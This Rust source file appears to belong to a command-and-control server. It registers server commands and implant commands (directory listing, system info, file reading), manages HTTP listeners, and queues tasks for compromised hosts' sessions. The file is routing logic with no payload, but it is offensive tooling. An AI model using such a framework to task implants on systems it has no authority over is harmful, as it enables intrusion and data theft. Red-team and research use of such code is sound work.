use crate::listener::http_listener::HttpListener;
use crate::listener::*;
use crate::message::{CommandError, CommandOutput, CommandRequest, CommandResult};
use crate::session::SessionManager;
use std::any::Any;
use std::collections::HashMap;
use std::result::Result;
use std::sync::Arc;
use std::sync::{Mutex, RwLock};
use uuid::Uuid;

use clap;

mod implant_cmds;
mod server_cmds;

// Define command types
pub enum CommandType {
    Server,  // Commands that control the server
    Implant, // Commands sent to implants
}

// Base Command trait that both types will implement
pub trait RbCommand: Send + Sync {
    fn name(&self) -> &'static str;
    fn command_type(&self) -> CommandType;
    fn description(&self) -> &'static str;
    fn clap_command(&self) -> clap::Command {
        let name = self.name();
        let description = self.description();

        clap::Command::new(name)
            .about(description)
            .arg_required_else_help(true)
    }
    fn parse_args(&self, command_line: &str) -> Result<Box<dyn Any>, clap::Error>;
    fn execute_with_parsed_args(
        &self,
        context: &mut CommandContext,
        args: Box<dyn Any>,
    ) -> CommandResult;
}

// Context passed to commands (can contain server state, active session, etc.)
pub struct CommandContext {
    // pub sessions: Arc<RwLock<HashMap<Uuid, Arc<Session>>>>,
    pub session_manager: Arc<RwLock<SessionManager>>,
    // pub active_session: Option<Arc<Session>>,
    pub command_registry: Arc<CommandRegistry>,
    // pub listeners: Arc<Mutex<HashMap<Uuid, Arc<Mutex<Box<dyn Listener>>>>>>, // Should switch to a generic listener type like this later
    pub listeners: Arc<Mutex<HashMap<Uuid, Arc<Mutex<Box<HttpListener>>>>>>, // For now, only
                                                                             // HTTP listeners
}

// Command Registry that holds both server and implant commands
pub struct CommandRegistry {
    server_commands: HashMap<String, Box<dyn RbCommand>>,
    implant_commands: HashMap<String, Box<dyn RbCommand>>,
}

impl CommandRegistry {
    pub fn new() -> Self {
        let mut registry = CommandRegistry {
            server_commands: HashMap::new(),
            implant_commands: HashMap::new(),
        };

        // Register built-in server commands
        registry.register(Box::new(server_cmds::ServerListenersCommand {}));
        registry.register(Box::new(server_cmds::ServerSessionsCommand {}));
        // registry.register(Box::new(ServerSessionsCommand {}));
        registry.register(Box::new(server_cmds::ServerHelpCommand {}));

        // Register built-in implant commands
        registry.register(Box::new(implant_cmds::ImplantLsCommand {}));
        registry.register(Box::new(implant_cmds::ImplantSysteminfoCommand {}));
        registry.register(Box::new(implant_cmds::ImplantPwdCommand {}));
        registry.register(Box::new(implant_cmds::ImplantCatCommand {}));

        registry
    }

    pub fn register(&mut self, command: Box<dyn RbCommand>) {
        match command.command_type() {
            CommandType::Server => {
                self.server_commands
                    .insert(command.name().to_string(), command);
            }
            CommandType::Implant => {
                self.implant_commands
                    .insert(command.name().to_string(), command);
            }
        }
    }

    pub fn get_server_command(&self, name: &str) -> Option<&Box<dyn RbCommand>> {
        self.server_commands.get(name)
    }

    pub fn get_implant_command(&self, name: &str) -> Option<&Box<dyn RbCommand>> {
        self.implant_commands.get(name)
    }

    pub fn list_server_commands(&self) -> Vec<&str> {
        self.server_commands.keys().map(|k| k.as_str()).collect()
    }

    pub fn list_implant_commands(&self) -> Vec<&str> {
        self.implant_commands.keys().map(|k| k.as_str()).collect()
    }

    // Execute a command with proper routing
    pub async fn execute(
        &self,
        context: &mut CommandContext,
        command_request: CommandRequest,
    ) -> CommandResult {
        // Parse the command
        let parts: Vec<&str> = command_request.command_line.split_whitespace().collect();
        if parts.is_empty() {
            return Err(CommandError::InvalidArguments(
                "No command specified".into(),
            ));
        }

        let command_name = parts[0];

        // Check if we have a session_id to determine command type
        if let Some(session_id) = command_request.session_id {
            // Execute implant command on a specific session
            if let Some(command) = self.get_implant_command(command_name) {
                // Verify the session exists
                let session_exists = {
                    let session_manager = context.session_manager.read().unwrap();
                    session_manager.get_session(&session_id).is_some()
                };

                if !session_exists {
                    return Err(CommandError::TargetNotFound(format!(
                        "Session with ID '{}' not found",
                        session_id
                    )));
                }

                return self
                    .execute_implant_command(
                        command,
                        context,
                        command_request.command_line.as_str(),
                        session_id,
                    )
                    .await;
            } else {
                return Err(CommandError::TargetNotFound(format!(
                    "Implant command '{}' not found",
                    command_name
                )));
            }
        } else {
            // No session_id, so it's a server command
            if let Some(command) = self.get_server_command(command_name) {
                return self
                    .execute_server_command(command, context, command_request.command_line.as_str())
                    .await;
            } else {
                return Err(CommandError::TargetNotFound(format!(
                    "Server command '{}' not found",
                    command_name
                )));
            }
        }
    }

    async fn execute_server_command(
        &self,
        command: &Box<dyn RbCommand>,
        context: &mut CommandContext,
        command_line: &str,
    ) -> CommandResult {
        // Parse arguments with clap
        let args_result = command.parse_args(command_line);

        match args_result {
            Ok(parsed_args) => {
                // Execute command with the parsed arguments
                command.execute_with_parsed_args(context, parsed_args)
            }
            Err(err) => Err(CommandError::InvalidArguments(format!(
                "Failed to parse arguments: {}",
                err
            ))),
        }
    }

    async fn execute_implant_command(
        &self,
        command: &Box<dyn RbCommand>,
        context: &mut CommandContext,
        command_line: &str,
        session_id: usize,
    ) -> CommandResult {
        // Parse arguments with clap
        let args_result = command.parse_args(command_line);

        match args_result {
            Ok(parsed_args) => {
                // Get the session
                let session = {
                    let session_manager = context.session_manager.read().unwrap();
                    match session_manager.get_session(&session_id) {
                        Some(s) => s,
                        None => {
                            return Err(CommandError::TargetNotFound(format!(
                                "Session with ID '{}' not found",
                                session_id
                            )))
                        }
                    }
                };

                let args = match parsed_args.downcast::<Vec<String>>() {
                    Ok(args) => *args,
                    Err(_) => return Err(CommandError::Internal("Invalid arguments type".into())),
                };

                if match session.create_task(command.name().to_string(), args) {
                    Ok(_) => true,
                    Err(err) => {
                        return Err(CommandError::TargetNotFound(format!(
                            "Failed to create task: {}",
                            err
                        )))
                    }
                } {
                    // Execute command with the parsed arguments
                    // command.execute_with_parsed_args(context, parsed_args)
                    Ok(CommandOutput::Text(format!(
                        "Tasked implant {} with '{}'",
                        session.implant_hostname(),
                        command.name(),
                    )))
                } else {
                    Err(CommandError::TargetNotFound(format!(
                        "Failed to create task for session with ID '{}'",
                        session_id
                    )))
                }
            }
            Err(err) => Err(CommandError::InvalidArguments(format!(
                "Failed to parse arguments: {}",
                err
            ))),
        }
    }
}
